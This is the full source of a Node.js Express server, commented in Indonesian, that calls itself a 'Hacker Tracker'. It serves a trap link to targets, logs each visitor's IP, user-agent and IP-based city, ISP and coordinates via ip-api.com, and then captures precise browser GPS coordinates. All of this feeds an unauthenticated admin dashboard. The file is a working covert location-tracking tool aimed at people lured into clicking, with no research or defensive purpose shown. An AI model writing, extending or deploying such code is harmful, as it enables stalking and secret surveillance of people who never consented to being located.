const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
// Menyediakan file statis dari folder public
app.use(express.static(path.join(__dirname, 'public')));

// Database Sementara di Memori untuk menyimpan Log Target
const targetLogs = [];

// API 1: Menangkap IP & Lokasi Otomatis saat target membuka link
app.get('/api/track-ip', async (req, res) => {
    // Tangkap IP Pengunjung (Mendukung proxy/ngrok)
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let clientIp = rawIp.split(',')[0].trim();

    // Jika dipanggil dari localhost, gunakan IP publik simulasi untuk testing
    if (clientIp === '::1' || clientIp === '127.0.0.1') {
        clientIp = '180.252.122.1'; // IP Contoh (Jakarta/Indonesia)
    }

    try {
        // Panggil API Geolocation IP eksternal (Gratis)
        const geoResponse = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,country,regionName,city,lat,lon,isp,query`);
        const geoData = geoResponse.data;

        const logData = {
            id: Date.now(),
            ip: clientIp,
            type: 'IP_GEOLOCATION',
            country: geoData.country || 'Unknown',
            city: geoData.city || 'Unknown',
            region: geoData.regionName || 'Unknown',
            isp: geoData.isp || 'Unknown',
            lat: geoData.lat || 0,
            lng: geoData.lon || 0,
            userAgent: req.headers['user-agent'],
            timestamp: new Date().toLocaleString('id-ID')
        };

        targetLogs.unshift(logData); // Simpan ke paling atas
        console.log(`[TARGET MASUK] IP: ${clientIp} | Kota: ${logData.city} | ISP: ${logData.isp}`);

        res.json({ status: 'success', logId: logData.id });
    } catch (error) {
        console.error('Gagal mengambil data IP:', error.message);
        res.status(500).json({ status: 'error' });
    }
});

// API 2: Memperbarui data dengan Koordinat GPS Presisi (jika target izinkan)
app.post('/api/track-gps', (req, res) => {
    const { logId, latitude, longitude, accuracy } = req.body;

    // Cari log berdasarkan logId
    const targetLog = targetLogs.find(log => log.id === logId);
    if (targetLog) {
        targetLog.type = 'GPS_HIGH_ACCURACY';
        targetLog.lat = latitude;
        targetLog.lng = longitude;
        targetLog.accuracy = `${accuracy} meter`;
        console.log(`[GPS DITERIMA!] Lat: ${latitude}, Lng: ${longitude} (Akurasi: ${accuracy}m)`);
    }

    res.json({ status: 'success' });
});

// API 3: Mengambil seluruh data target untuk Dashboard Admin
app.get('/api/admin/logs', (req, res) => {
    res.json(targetLogs);
});

app.listen(PORT, () => {
    console.log(`====================================================`);
    console.log(`Server Hacker Tracker Aktif di http://localhost:${PORT}`);
    console.log(`Link Jebakan (Target) : http://localhost:${PORT}/client.html`);
    console.log(`Dashboard Admin (Kamu) : http://localhost:${PORT}/admin.html`);
    console.log(`====================================================`);
});